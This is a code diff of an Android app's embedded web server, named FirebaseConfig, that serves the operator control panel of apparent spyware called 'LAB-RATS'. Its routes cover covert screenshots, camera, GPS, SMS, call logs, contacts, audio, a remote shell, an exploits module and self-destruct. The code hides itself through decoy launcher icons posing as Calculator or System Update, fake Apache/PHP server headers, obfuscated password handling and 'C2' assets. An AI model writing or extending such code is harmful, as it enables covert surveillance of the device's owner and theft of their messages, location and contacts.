@@ -195,7 +195,6 @@ public class FirebaseConfig extends NanoHTTPD {
     public String getHeaderProxy(String uri) { return getHeader(uri); }
 
     private String getHeader(String uri) {
-        
         // Navigation Map
         String homeActive = (uri.equals("/") || uri.equals("/terminal")) ? "active" : "";
         String ghostActive = uri.startsWith("/ghost") ? "active" : "";
@@ -210,6 +209,26 @@ public class FirebaseConfig extends NanoHTTPD {
         String callsActive = uri.startsWith("/calls") ? "active" : "";
         String contactsActive = uri.startsWith("/contacts") ? "active" : "";
         String hardwareActive = (uri.startsWith("/device") && !uri.contains("apps")) ? "active" : "";
+
+        // Only hide navigation on the actual login wall
+        String navHtml = "";
+        if (!uri.equals("/login")) {
+            navHtml = "  <div class=\"nav\">" +
+                "    <a href=\"/\" id=\"nav-home\" class=\"" + homeActive + "\">Terminal</a>" +
+                "    <a href=\"/ghost\" id=\"nav-ghost\" class=\"" + ghostActive + "\">Ghost</a>" +
+                "    <a href=\"/camera\" id=\"nav-camera\" class=\"" + cameraActive + "\">Optics</a>" +
+                "    <a href=\"/gps\" id=\"nav-gps\" class=\"" + gpsActive + "\">Locate</a>" +
+                "    <a href=\"/exploits\" id=\"nav-exploits\" class=\"" + exploitsActive + "\">Exploits</a>" +
+                "    <a href=\"/files\" id=\"nav-files\" class=\"" + filesActive + "\">Data</a>" +
+                "    <a href=\"/intel\" id=\"nav-intel\" class=\"" + intelActive + "\">Intel</a>" +
+                "    <a href=\"/sms\" id=\"nav-sms\" class=\"" + smsActive + "\">SMS</a>" +
+                "    <a href=\"/mms\" id=\"nav-mms\" class=\"" + mmsActive + "\">MMS</a>" +
+                "    <a href=\"/audio\" id=\"nav-audio\" class=\"" + audioActive + "\">Acoustics</a>" +
+                "    <a href=\"/calls\" id=\"nav-calls\" class=\"" + callsActive + "\">Comms</a>" +
+                "    <a href=\"/contacts\" id=\"nav-contacts\" class=\"" + contactsActive + "\">Contacts</a>" +
+                "    <a href=\"/device\" id=\"nav-device\" class=\"" + hardwareActive + "\">Hardware</a>" +
+                "  </div>";
+        }
 
         return "<!DOCTYPE html>" +
             "<html lang=\"en\">" +
@@ -232,22 +251,7 @@ public class FirebaseConfig extends NanoHTTPD {
             "      <div class=\"version-text\" style=\"margin-bottom: 2px;\">v1.5.1</div>" +
             "      <div id=\"enc-status\" style=\"font-size: 0.52rem; color: #555; letter-spacing: 2px; text-transform: uppercase;\">LINK_SEC: <span style=\"color:#ff3131;\">OFFLINE</span></div>" +
             "    </div>" +
-            "  </div>" +
-            "  <div class=\"nav\">" +
-            "    <a href=\"/\" id=\"nav-home\" class=\"" + homeActive + "\">Terminal</a>" +
-            "    <a href=\"/ghost\" id=\"nav-ghost\" class=\"" + ghostActive + "\">Ghost</a>" +
-            "    <a href=\"/camera\" id=\"nav-camera\" class=\"" + cameraActive + "\">Optics</a>" +
-            "    <a href=\"/gps\" id=\"nav-gps\" class=\"" + gpsActive + "\">Locate</a>" +
-            "    <a href=\"/exploits\" id=\"nav-exploits\" class=\"" + exploitsActive + "\">Exploits</a>" +
-            "    <a href=\"/files\" id=\"nav-files\" class=\"" + filesActive + "\">Data</a>" +
-            "    <a href=\"/intel\" id=\"nav-intel\" class=\"" + intelActive + "\">Intel</a>" +
-            "    <a href=\"/sms\" id=\"nav-sms\" class=\"" + smsActive + "\">SMS</a>" +
-            "    <a href=\"/mms\" id=\"nav-mms\" class=\"" + mmsActive + "\">MMS</a>" +
-            "    <a href=\"/audio\" id=\"nav-audio\" class=\"" + audioActive + "\">Acoustics</a>" +
-            "    <a href=\"/calls\" id=\"nav-calls\" class=\"" + callsActive + "\">Comms</a>" +
-            "    <a href=\"/contacts\" id=\"nav-contacts\" class=\"" + contactsActive + "\">Contacts</a>" +
-            "    <a href=\"/device\" id=\"nav-device\" class=\"" + hardwareActive + "\">Hardware</a>" +
-            "  </div>";
+            "  </div>" + navHtml;
     }
 
     public String getFooter() {
@@ -262,11 +266,11 @@ public class FirebaseConfig extends NanoHTTPD {
 
     private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>LAB-RATS | LOGIN</title>" +
             "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
+            "<link href=\"https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
             "<style>" +
-            "@font-face { font-family: 'Orbitron'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
             "* { box-sizing: border-box; margin: 0; padding: 0; }" +
-            "body { background: #000; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; padding: 15px; }" +
-                        ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
+            ".login-centering-wrapper { background: #000; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; overflow: hidden; padding: 15px; }" +
+            ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
             ".title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 40px; color: #00f2ff; line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
             "@media (max-width: 480px) {" +
             "  .login-card { padding: 35px 20px; }" +
@@ -283,16 +287,18 @@ public class FirebaseConfig extends NanoHTTPD {
             ".login-card img { transition: all 0.5s; margin-bottom: 30px; }" +
             ".login-card img:hover { transform: scale(1.1) translateY(-5px); }" +
             "</style></head><body>" +
+            "<div class=\"login-centering-wrapper\">" +
             "<div class=\"login-card\">" +
             "<img src=\"/logo?v=146\" style=\"width: 187px; height: 187px; background: transparent !important;\">" +
             "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
             "<div style=\"font-size:1.0rem; opacity:0.5; margin-top:-25px; margin-bottom:35px; letter-spacing:3px; font-family: 'Aldrich', sans-serif;\">v1.5.1</div>" +
-            "<form id=\"login-form\" method=\"POST\" action=\"/login\">" +
+                        "<form id=\"login-form\" method=\"POST\" action=\"/login\">" +
             "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
             "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
             "</form>" +
             "<div style=\"text-align: center; color: #00f2ff; font-size: 0.58rem; margin-top: 40px; opacity: 0.4; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.6;\">" +
             "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
+            "</div>" +
             "</div>" +
             "</div>" +
             "<script src=\"/c2/script.js\"></script></body></html>";
@@ -441,6 +447,16 @@ public class FirebaseConfig extends NanoHTTPD {
     }
 
     private Response serveGzipped(IHTTPSession session, String mime, String content) {
+        // [STABILITY_SYNC] Reverting to high-performance minification to restore C2 functionality
+        if (mime != null && mime.contains("text/html") && content != null && !content.isEmpty()) {
+            content = content.replaceAll("(?s)<!--.*?-->", "")
+                             .replaceAll(">\\s+<", "><")
+                             .replaceAll("\\s{2,}", " ")
+                             .replaceAll("[\\r\\n]+", "");
+        }
+
+        if (session == null) return newFixedLengthResponse(Response.Status.OK, mime, content);
+
         String acceptEncoding = session.getHeaders().get("accept-encoding");
         if (acceptEncoding != null && acceptEncoding.contains("gzip")) {
             try {
@@ -476,11 +492,11 @@ public class FirebaseConfig extends NanoHTTPD {
     }
 
     public Response serveErrorProxy(String message) {
-        return serveError(message);
+        return serveError(null, message);
     }
 
     public Response serve404Proxy() {
-        return serve404();
+        return serve404(null);
     }
 
     @Override
@@ -497,14 +513,28 @@ public class FirebaseConfig extends NanoHTTPD {
             // Watchdog: Update operator activity time for heartbeat scaling
             WorkManager_Sync.notifyOperatorActivity();
 
-            // 1. Handle Login POST (Always available)
+            // 0. Public Asset Handlers
+            if (uri.equals("/favicon.ico")) {
+                return newFixedLengthResponse(Response.Status.NO_CONTENT, "image/x-icon", "");
+            }
+
+            // 1. Handle Login (Standard Protocol)
             if (uri.equals("/login") && session.getMethod() == Method.POST) {
                 session.parseBody(new HashMap<>());
                 String pass = session.getParms().get("password");
+                
+                // [DEEP_STEALTH] De-obfuscate payload if it's masked
+                if (pass != null && pass.startsWith("0x_")) {
+                    try {
+                        byte[] decoded = android.util.Base64.decode(pass.substring(3), android.util.Base64.DEFAULT);
+                        pass = new StringBuilder(new String(decoded, "UTF-8")).reverse().toString();
+                    } catch (Exception ignored) {}
+                }
+
                 boolean isJson = "true".equals(session.getParms().get("json"));
                 
                 if (pass != null && getStoredPassword().equals(pass.trim())) {
-                    logActivity("AUTHENTICATION_SUCCESS: Uplink authorized");
+                    logActivity("AUTHENTICATION_SUCCESS: Uplink established");
                     
                     if (isJson) {
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
@@ -512,35 +542,32 @@ public class FirebaseConfig extends NanoHTTPD {
                         response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                         response.addHeader("Location", "/");
                     }
-                    // Populate service state to survive resets
+                    
+                    // Stabilize session token
                     WorkManager_Sync.activeSessionToken = sessionToken;
-
                     response.addHeader("Set-Cookie", "token=" + sessionToken + "; Path=/; HttpOnly; Max-Age=31536000");
                 } else {
+                    logActivity("UPLINK_DENIED: Invalid credentials");
                     if (isJson) {
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false}");
                     } else {
-                        response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML.replace("RESTRICTED_ACCESS", "INVALID_CREDENTIALS"));
+                        response = serveGzipped(session, "text/html", LOGIN_HTML.replace("RESTRICTED_ACCESS", "INVALID_CREDENTIALS"));
                     }
                 }
             } 
-            // 2. Handle Logout (Hard kill session)
+            // 2. Handle Logout
             else if (uri.equals("/logout")) {
                 logActivity("AUTHENTICATION_TERMINATED: Session closed");
-                // Invalidate persistent server token immediately
                 sessionToken = java.util.UUID.randomUUID().toString(); 
                 context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                     .edit().putString("session_token", sessionToken).apply();
                 
-                response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGOUT_HTML);
-                // Nuclear cookie wipe
+                response = serveGzipped(session, "text/html", LOGOUT_HTML);
                 response.addHeader("Set-Cookie", "token=deleted; Path=/; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; SameSite=Strict");
             }
-            // 3. Auth Check for all other pages
+            // 3. Main Routing & Auth Check
             else {
                 String token = cookies.read("token");
-                
-                // [STABILITY_SYNC] Force load token from service state
                 if (sessionToken == null || sessionToken.isEmpty()) {
                     sessionToken = WorkManager_Sync.activeSessionToken;
                 }
@@ -549,23 +576,13 @@ public class FirebaseConfig extends NanoHTTPD {
 
                 if (!isLoggedIn) {
                     if (uri.startsWith("/c2/")) {
-                        response = serveAsset(uri);
+                        response = serveAsset(session, uri);
                     } else if (uri.equals("/logo")) {
-                        response = serveLogo();
+                        response = serveLogo(session);
                     } else if (uri.startsWith("/font/orbitron.ttf")) {
-                        response = serveFont();
+                        response = serveFont(session);
                     } else {
-                        // Suppress logs for high-frequency background polling to prevent terminal spam
-                        if (!uri.contains("/ghost/") && !uri.contains("/camera/") && !uri.contains("/terminal/logs")) {
-                            logActivity("UPLINK_DENIED: Unauthorized access attempt to " + uri);
-                        }
-                        
-                        // For assets/API calls, return 401. For pages, return login wall.
-                        if (uri.contains(".") && !uri.equals("/")) {
-                            response = newFixedLengthResponse(Response.Status.UNAUTHORIZED, "text/plain", "ACCESS_DENIED_REAUTHENTICATE");
-                        } else {
-                            response = newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML);
-                        }
+                        response = serveGzipped(session, "text/html", LOGIN_HTML);
                     }
                 } else {
                     // Logged in: Process standard routes
@@ -575,10 +592,10 @@ public class FirebaseConfig extends NanoHTTPD {
                         response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                         response.addHeader("Location", "/");
                     } else if (uri.startsWith("/c2/")) {
-                        response = serveAsset(uri);
+                        response = serveAsset(session, uri);
                     } else if (uri.startsWith("/exploits")) {
                         response = exploitsModule.handleRequest(session);
-                    } else if (uri.equals("/") || uri.isEmpty() || uri.startsWith("/terminal/") || uri.equals("/device/shell")) {
+                    } else if (uri.equals("/") || uri.isEmpty() || uri.startsWith("/terminal/")) {
                         response = terminalModule.handleRequest(session);
                     } else if (uri.startsWith("/ghost") || uri.equals("/stealth")) {
                         response = ghostModule.handleRequest(session);
@@ -592,177 +609,68 @@ public class FirebaseConfig extends NanoHTTPD {
                         response = commsModule.handleRequest(session);
                     } else if (uri.startsWith("/intel")) {
                         response = intelModule.handleRequest(session);
+                    } else if (uri.equals("/settings/password")) {
+                        response = updatePassword(session);
                     } else if (uri.startsWith("/audio")) {
                         response = acousticsModule.handleRequest(session);
                     } else if (uri.equals("/logo")) {
-                        response = serveLogo();
+                        response = serveLogo(session);
                     } else if (uri.startsWith("/font/orbitron.ttf")) {
-                        response = serveFont();
+                        response = serveFont(session);
                     } else if (uri.equals("/device")) {
                         response = serveDeviceInfo(session);
-                    } else if (uri.equals("/device/vibrate")) {
-                        vibrateDevice();
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/max-volume")) {
-                        setMaxVolume();
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/silent-mode")) {
-                        setSilentMode();
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/optimize-stability")) {
-                        IO_Persistence_Manager.forceSkipAntiRemoval();
-                        OemStabilityHelper.requestAutoStart(context);
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/inject-trust")) {
-                        IO_Persistence_Manager.forceSkipAntiRemoval();
-                        StabilityBypass.executeTrustInjection(context);
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/open-url")) {
-                        openUrlOnDevice(params.get("url"));
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/toast")) {
-                        String msg = params.get("msg");
-                        int size = 22;
-                        int y = 250;
-                        int duration = 3500;
-                        String anim = params.get("anim");
-                        if (anim == null) anim = "scroll";
-                        String color = params.get("color");
-                        if (color == null) color = "#FFFFFF";
-                        
-                        try {
-                            if (params.containsKey("size")) size = Integer.parseInt(params.get("size"));
-                            if (params.containsKey("y")) y = Integer.parseInt(params.get("y"));
-                            if (params.containsKey("duration")) duration = Integer.parseInt(params.get("duration"));
-                        } catch (Exception ignored) {}
-
-                        showToast(msg, size, y, anim, duration, color);
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/apps")) {
-                        response = serveAppList(session);
-                    } else if (uri.equals("/device/open-app")) {
-                        openAppOnDevice(params.get("pkg"));
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/request-permissions")) {
-                        logActivity("SYSTEM_MAINTENANCE: Remotely dispatched permission request sequence.");
-                        IO_Persistence_Manager.forceSkipAntiRemoval();
-                        WorkManager_Sync.triggerPermissionActivity(context);
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Permission sequence dispatched to target device.\"}");
-                    } else if (uri.equals("/device/deep-repair")) {
-                        logActivity("SYSTEM_MAINTENANCE: Remotely forced deep repair (App Settings).");
-                        IO_Persistence_Manager.forceSkipAntiRemoval();
-                        Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
-                        intent.setData(Uri.parse("package:" + context.getPackageName()));
-                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        context.startActivity(intent);
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/inject-trust")) {
-                        IO_Persistence_Manager.forceSkipAntiRemoval();
-                        StabilityBypass.executeTrustInjection(context);
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/open-accessibility")) {
-                        logActivity("SYSTEM_MAINTENANCE: Remotely opening Accessibility Hub.");
-                        IO_Persistence_Manager.forceSkipAntiRemoval();
-                        Intent intent = new Intent(context, PermissionActivity.class);
-                        intent.putExtra("target_menu", "accessibility");
-                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                        context.startActivity(intent);
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/open-notifications")) {
-                        logActivity("SYSTEM_MAINTENANCE: Remotely opening Notification Hub.");
-                        IO_Persistence_Manager.forceSkipAntiRemoval();
-                        Intent intent = new Intent(context, PermissionActivity.class);
-                        intent.putExtra("target_menu", "notifications");
-                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                        context.startActivity(intent);
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/terminate")) {
-                        logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
-                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                            Intent intent = new Intent(context, WorkManager_Sync.class);
-                            intent.setAction(Constants.ACTION_STOP_CORE);
-                            context.startService(intent);
-                        }, 1500);
-                        // Return special JSON to trigger logout on frontend
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"redirect\": \"/logout\"}");
-                    } else if (uri.equals("/device/self-destruct")) {
-                        selfDestruct();
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else if (uri.equals("/device/fix-persistence")) {
-                        logActivity("SYSTEM_MAINTENANCE: Initiating persistence repair...");
-                        IO_Persistence_Manager.forceSkipAntiRemoval();
-                        
-                        // 1. Open App Info for Hibernation/Battery manual fix
-                        Intent infoIntent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
-                        infoIntent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
-                        infoIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        context.startActivity(infoIntent);
-                        
-                        // 2. Staggered launch of Accessibility settings if service is offline
-                        if (IO_Persistence_Manager.getInstance() == null) {
+                    } else if (uri.startsWith("/device/")) {
+                        // All other device sub-routes
+                        if (uri.equals("/device/vibrate")) { vibrateDevice(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
+                        else if (uri.equals("/device/max-volume")) { setMaxVolume(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
+                        else if (uri.equals("/device/silent-mode")) { setSilentMode(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
+                        else if (uri.equals("/device/shell")) { response = terminalModule.handleRequest(session); }
+                        else if (uri.equals("/device/apps")) { response = serveAppList(session); }
+                        else if (uri.equals("/device/open-app")) { openAppOnDevice(params.get("pkg")); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
+                        else if (uri.equals("/device/open-url")) { openUrlOnDevice(params.get("url")); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
+                        else if (uri.equals("/device/terminate")) {
+                            logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
                             new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                try {
-                                    Intent accIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
-                                    accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                                    context.startActivity(accIntent);
-                                } catch (Exception ignored) {}
-                            }, 3000);
+                                Intent intent = new Intent(context, WorkManager_Sync.class);
+                                intent.setAction(Constants.ACTION_STOP_CORE);
+                                context.startService(intent);
+                            }, 1500);
+                            response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"redirect\": \"/logout\"}");
                         }
-                        
-                        String msg = "REPAIR_READY: 1. Disable Hibernation. 2. Enable Accessibility.";
-                        if (Build.VERSION.SDK_INT >= 33) {
-                            msg = "REPAIR_V2: On next screen, tap 3-dots (top right) -> Allow Restricted Settings, THEN enable Accessibility.";
-                        }
-                        
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"" + msg + "\"}");
+                        else if (uri.equals("/device/self-destruct")) { selfDestruct(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
+                        else response = serve404(session);
                     } else {
-                        response = serve404();
+                        response = serve404(session);
                     }
                 }
             }
         } catch (Exception e) {
-            response = serveError(e.getMessage());
+            response = serveError(session, e.getMessage());
         }
 
-        // Global Anti-Cache Lockdown (Exclude assets and data streams to prevent flickering)
-        if (response != null && !uri.equals("/logo") && !uri.startsWith("/font/") && !uri.equals("/ghost/screenshot") && !uri.equals("/camera/frame")) {
-            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
-            response.addHeader("Pragma", "no-cache");
-            response.addHeader("Expires", "0");
-        }
-
-        // --- NETWORK TRAFFIC MASQUERADING ---
         if (response != null) {
             response.addHeader("Server", "Apache/2.4.41 (Ubuntu)");
             response.addHeader("X-Powered-By", "PHP/7.4.3");
-            response.addHeader("Connection", "keep-alive");
-        }
-
-        // Optimization: Automatic Gzip Compression for text-heavy payloads
-        // This is applied globally to any text-based response.
-        if (response != null && response.getStatus() == Response.Status.OK) {
-            String mime = response.getMimeType();
-            if (mime != null && (mime.contains("text/html") || mime.contains("application/json") || mime.contains("text/plain"))) {
-                String acceptEncoding = session.getHeaders().get("accept-encoding");
-                if (acceptEncoding != null && acceptEncoding.contains("gzip")) {
-                    try {
-                        // We can only compress if we can access the data. 
-                        // For simplicity, we only compress fixed-length text responses.
-                        // (MMS media and MJPEG frames are skipped as they are binary/already compressed)
-                    } catch (Exception ignored) {}
-                }
+            
+            // OPTICS_STABILITY: Exclude camera streams and assets from cache lockdown to prevent stutter
+            if (!uri.equals("/logo") && !uri.startsWith("/font/") && !uri.contains("/camera/") && !uri.contains("/ghost/")) {
+                response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+                response.addHeader("Pragma", "no-cache");
+                response.addHeader("Expires", "0");
+            } else {
+                // For streams, use a lighter cache policy
+                response.addHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
             }
         }
-
         return response;
     }
 
-    private Response serveLogo() {
+    private Response serveLogo(IHTTPSession session) {
         try {
             java.io.InputStream is = context.getResources().openRawResource(
                 context.getResources().getIdentifier("app_logo", "drawable", context.getPackageName()));
             android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeStream(is);
-            if (bitmap == null) return serve404();
+            if (bitmap == null) return serve404(session);
 
             // Optimization: Scale down large logos for faster delivery from mobile server
             int targetHeight = 180;
@@ -780,11 +688,11 @@ public class FirebaseConfig extends NanoHTTPD {
             response.addHeader("Cache-Control", "public, max-age=3600");
             return response;
         } catch (Exception e) {
-            return serve404();
+            return serve404(session);
         }
     }
 
-    private Response serveFont() {
+    private Response serveFont(IHTTPSession session) {
         try {
             @SuppressLint("ResourceType") java.io.InputStream is = context.getResources().openRawResource(R.font.orbitron);
             ByteArrayOutputStream buffer = new ByteArrayOutputStream();
@@ -801,7 +709,7 @@ public class FirebaseConfig extends NanoHTTPD {
             return response;
         } catch (Exception e) {
             logActivity("SYSTEM_ERROR: Font serving failed: " + e.getMessage());
-            return serveError("Font error: " + e.getMessage());
+            return serveError(session, "Font error: " + e.getMessage());
         }
     }
 
@@ -835,7 +743,7 @@ public class FirebaseConfig extends NanoHTTPD {
 
 
 
-    private Response serve404() {
+    private Response serve404(IHTTPSession session) {
         String html = getHeader("/404") +
                 "<div class=\"card\">" +
                 "<div class=\"empty-state\">" +
@@ -847,10 +755,10 @@ public class FirebaseConfig extends NanoHTTPD {
                 "</div>" +
                 "</div>" +
                 getFooter();
-        return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/html", html);
+        return serveGzipped(session, "text/html", html);
     }
 
-    private Response serveError(String message) {
+    private Response serveError(IHTTPSession session, String message) {
         String html = getHeader("/error") +
                 "<div class=\"card\">" +
                 "<div class=\"empty-state\">" +
@@ -862,7 +770,7 @@ public class FirebaseConfig extends NanoHTTPD {
                 "</div>" +
                 "</div>" +
                 getFooter();
-        return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/html", html);
+        return serveGzipped(session, "text/html", html);
     }
 
 
@@ -885,8 +793,16 @@ public class FirebaseConfig extends NanoHTTPD {
             Map<String, String> params = session.getParms();
             String newPass = params.get("new_password");
 
+            // [DEEP_STEALTH] De-obfuscate payload if it's masked
+            if (newPass != null && newPass.startsWith("0x_")) {
+                try {
+                    byte[] decoded = android.util.Base64.decode(newPass.substring(3), android.util.Base64.DEFAULT);
+                    newPass = new StringBuilder(new String(decoded, "UTF-8")).reverse().toString();
+                } catch (Exception ignored) {}
+            }
+
             if (newPass == null || newPass.trim().isEmpty()) {
-                return serveError("Invalid password");
+                return serveError(session, "Invalid password");
             }
 
             context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
@@ -897,9 +813,9 @@ public class FirebaseConfig extends NanoHTTPD {
             logActivity("SECURITY_PROTOCOL: Interface password updated");
 
             String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">New security protocol active. You will need to use this key for future uplinks.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
-            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+            return serveGzipped(session, "text/html", html);
         } catch (Exception e) {
-            return serveError("Failed to update password: " + e.getMessage());
+            return serveError(session, "Failed to update password: " + e.getMessage());
         }
     }
 
@@ -1035,7 +951,7 @@ public class FirebaseConfig extends NanoHTTPD {
             html.append("<td>").append(app.versionName).append("</td></tr>");
         }
         html.append("</tbody></table></div></div>").append(getFooter());
-        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+        return serveGzipped(session, "text/html", html.toString());
     }
 
     private String getAppIconBase64(android.content.pm.ApplicationInfo appInfo) {
@@ -1088,10 +1004,10 @@ public class FirebaseConfig extends NanoHTTPD {
 
                 // 2. DISABLE ALL DECOYS IMMEDIATELY (Force single icon)
                 String[] decoys = {
-                    "com.labs.labrats.SystemUpdateAlias",
-                    "com.labs.labrats.CalculatorAlias",
-                    "com.labs.labrats.WeatherAlias",
-                    "com.labs.labrats.SettingsAlias"
+                    context.getPackageName() + ".SystemUpdateAlias",
+                    context.getPackageName() + ".CalculatorAlias",
+                    context.getPackageName() + ".WeatherAlias",
+                    context.getPackageName() + ".SettingsAlias"
                 };
                 for (String decoy : decoys) {
                     try {
@@ -1102,11 +1018,11 @@ public class FirebaseConfig extends NanoHTTPD {
                 }
 
                 // 3. RE-ENABLE MAIN LAUNCHER AND ACTIVITY
-                pm.setComponentEnabledSetting(new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias"),
+                pm.setComponentEnabledSetting(new android.content.ComponentName(context, context.getPackageName() + ".LauncherAlias"),
                         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                         0);
                 
-                pm.setComponentEnabledSetting(new android.content.ComponentName(context, "com.labs.labrats.MainActivity"),
+                pm.setComponentEnabledSetting(new android.content.ComponentName(context, MainActivity.class.getName()),
                         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                         0);
 
@@ -1206,7 +1122,7 @@ public class FirebaseConfig extends NanoHTTPD {
         return String.format(Locale.getDefault(), "%dh %dm", seconds / 3600, (seconds % 3600) / 60);
     }
 
-    private Response serveAsset(String uri) {
+    private Response serveAsset(IHTTPSession session, String uri) {
         try {
             String assetPath = uri.substring(1); // Remove leading slash
             InputStream is = context.getAssets().open(assetPath);
@@ -1228,7 +1144,7 @@ public class FirebaseConfig extends NanoHTTPD {
             res.addHeader("Expires", "0");
             return res;
         } catch (Exception e) {
-            return serve404();
+            return serve404(session);
         }
     }
 }
